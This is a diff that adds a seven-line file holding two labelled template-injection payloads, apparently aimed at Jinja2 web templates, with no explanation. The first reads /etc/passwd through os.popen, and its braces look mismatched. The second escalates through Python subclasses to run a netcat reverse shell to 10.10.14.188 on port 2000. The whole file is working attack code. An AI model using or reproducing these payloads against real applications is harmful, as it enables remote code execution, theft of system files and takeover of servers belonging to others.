@@ -1,0 +1,7 @@
+[𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝟭]
+
+{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+
+[𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝟮]
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("nc.traditional 10.10.14.188 2000 -e /bin/sh").read()}}{%endif%}{% endfor %}
